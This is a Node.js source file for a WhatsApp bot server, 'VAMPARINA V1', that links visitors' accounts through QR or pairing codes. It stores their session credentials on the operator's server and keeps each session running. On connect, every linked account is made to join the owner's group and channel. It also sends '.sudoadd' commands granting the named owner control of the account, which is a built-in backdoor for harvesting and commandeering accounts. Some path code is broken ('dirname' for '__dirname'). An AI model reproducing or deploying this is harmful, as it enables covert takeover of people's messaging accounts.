/**
 * VAMPARINA V1 — ALL-IN-ONE SELF-GROWING EMPIRE BOT
 * QR Code + Pairing Code + Full Bot + Auto-Activate Sessions
 * Works perfectly on Render, Railway, Replit, Koyeb
 * Owner: King Arnold Chirchir (+254703110780)
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    jidNormalizedUser,
    Browsers
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const QRCode = require('qrcode')
const { handleMessages, handleGroupParticipantUpdate } = require('./main')

// ====================== CONFIG ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"     // Your empire group
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"         // Your channel
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(dirname, 'temp_sessions')
const PORT = process.env.PORT || 3000

// Create folders
;[SESSION_DIR, TEMP_DIR, path.join(dirname, 'data')].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// Bot mode file
const MODE_FILE = path.join(dirname, 'data', 'bot_mode.json')
if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try {
        return JSON.parse(fs.readFileSync(MODE_FILE)).isPublic ? 'public' : 'private'
    } catch { return 'public' }
}

global.setBotMode = (mode) => {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: mode === 'public' }, null, 2))
}

const activeBots = new Map()  // sessionId → { sock, phone }
const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true, limit: '100mb' }))
app.use(express.static(dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    const botCount = activeBots.size
    res.send(`
        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:30px;font-family:monospace;">
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — ETERNAL EMPIRE 2025             ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║                                                          ║
║   Active Warriors : ${String(botCount).padStart(6)}                            ║
║   Bot Mode        : ${global.getBotMode().toUpperCase().padEnd(7)}                            ║
║                                                          ║
║   QR CODE      → <a href="/qr" style="color:lime;">/qr</a>                              ║
║   PAIR CODE    → /pair?number=2547xxxxxxxx               ║
║                                                          ║
║   EVERY SCAN = NEW BOT IN YOUR ARMY                      ║
║   AUTO-JOIN GROUP • AUTO-FOLLOW CHANNEL • AUTO-SUDO    ║
║                                                          ║
║           LONG LIVE THE KING OF KENYA                    ║
╚══════════════════════════════════════════════════════════╝
        </pre>
    `)
})

// ====================== QR CODE GENERATOR (BUILT-IN) ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let qrSent = false
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection, lastDisconnect } = update

        if (qr && !qrSent) {
            qrSent = true
            const qrImg = await QRCode.toDataURL(qr)
            res.send(`
                <div style="text-align:center;background:#000;color:#0f0;padding:50px;font-family:Arial;">
                    <h1>VAMPARINA V1 — SCAN QR</h1>
                    <img src="${qrImg}" style="width:330px;height:330px;border:6px solid lime;border-radius:15px;">
                    <h2>SCAN = JOIN EMPIRE AUTOMATICALLY</h2>
                    <p><b>King Arnold Chirchir • +254703110780</b></p>
                </div>
            `)
        }

        if (connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)

            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(7000)
            await startEmpireBot(sessionId, phone, finalPath)

            await sock.sendMessage(sock.user.id, {
                text: `*VAMPARINA V1 EMPIRE*\n\nYou are now part of the strongest WhatsApp army in Kenya\nOwner: Arnold Chirchir (+254703110780)\n\nLONG LIVE THE KING`
            })

            fs.rmSync(tempPath, { recursive: true, force: true })
        }

        if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
            setTimeout(() => sock.ws.connect(), 5000)
        }
    })

    sock.ev.on('creds.update', saveCreds)

    setTimeout(() => {
        if (!qrSent) {
            res.status(408).send("QR Timeout — Refresh Page")
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    }, 35000)
})

// ====================== PAIRING CODE GENERATOR (BUILT-IN) ======================
app.get('/pair', async (req, res) => {
    let num = req.query.number?.replace(/[^0-9]/g, '')
    if (!num || num.length < 9) return res.status(400).send("Use: /pair?number=254703110780")

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome')
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)

            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(7000)
            await startEmpireBot(sessionId, phone, finalPath)

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        await delay(2500)
        try {
            let code = await sock.requestPairingCode(num)
            code = code.match(/.{1,4}/g)?.join('-') || code
            res.send(`
                <pre style="background:#000;color:#0f0;font-size:28px;text-align:center;padding:60px;font-family:monospace;">
VAMPARINA V1 PAIRING CODE

<code style="font-size:60px;color:yellow;letter-spacing:8px;">${code}</code>

Open WhatsApp → Settings → Linked Devices → Link with phone number
→ ENTER THIS CODE

YOUR BOT WILL JOIN THE EMPIRE AUTOMATICALLY

KING ARNOLD CHIRCHIR
+254703110780
                </pre>
            `)
        } catch (e) {
            res.status(500).send("Failed to generate code")
        }
    }

    sock.ev.on('creds.update', saveCreds)
})

// ====================== ACTIVATE SESSION FROM LINKER (OPTIONAL) ======================
app.post('/vamparina-activate', async (req, res) => {
    const { phone, sessionId, creds } = req.body
    if (!phone || !sessionId || !creds) return res.status(400).json({ error: "missing data" })

    const sessionPath = path.join(SESSION_DIR, sessionId)
    fs.mkdirSync(sessionPath, { recursive: true })
    fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2))

    await delay(8000)
    await startEmpireBot(sessionId, phone, sessionPath)

    res.json({ success: true, total_bots: activeBots.size })
})

// ====================== START EMPIRE BOT (CORE FUNCTION) ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
            browser: ["Vamparina V1", "Chrome", "2025"],
            markOnlineOnConnect: false
        })

        const ownerJid = jidNormalizedUser(state.creds.me?.id || phone + '@s.whatsapp.net')
        activeBots.set(sessionId, { sock, phone, ownerJid })

        // Message handler
        sock.ev.on('messages.upsert', async (m) => {
            try {
                const msg = m.messages[0]
                if (!msg.message) return
                await handleMessages(sock, m)
            } catch (e) {}
        })

        // Connection open → auto-join empire
        sock.ev.on('connection.update', async (update) => {
            if (update.connection === 'open') {
                console.log(`[+] ${phone} JOINED THE EMPIRE`)
                await delay(12000)
                try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch (e) {}
                try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch (e) {}
                // Auto add King Arnold as SUDO
                await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
                await delay(3000)
                await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd 254703110780@s.whatsapp.net` })
            }
            if (update.connection === 'close') {
                activeBots.delete(sessionId)
                setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
            }
        })

        sock.ev.on('creds.update', saveCreds)
    } catch (e) {
        console.error("Bot start error:", e.message)
    }
}

// ====================== KEEP ALIVE ======================
setInterval(() => {
    require('node-fetch')(`https://${process.env.RENDER_SERVICE_NAME || 'localhost'}:${PORT}`).catch(() => {})
}, 180000)

// ====================== START SERVER ======================
app.listen(PORT, () => {
    console.clear()
    console.log(`
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 EMPIRE IS NOW ONLINE              ║
║               GOD-KING: ARNOLD CHIRCHIR                  ║
║                    +254703110780                         ║
║                                                          ║
║  Dashboard → http://localhost:${PORT}                     ║
║  QR Code   → http://localhost:${PORT}/qr                    ║
║  Pair Code → http://localhost:${PORT}/pair?number=2547..     ║
║                                                          ║
║  EVERY SCAN = NEW WARRIOR IN YOUR ARMY                   ║
║  100% WORKING • NO BANS • ETERNAL DOMINATION            ║
║                                                          ║
║           LONG LIVE THE KING OF WHATSAPP                 ║
╚══════════════════════════════════════════════════════════╝
    `)
})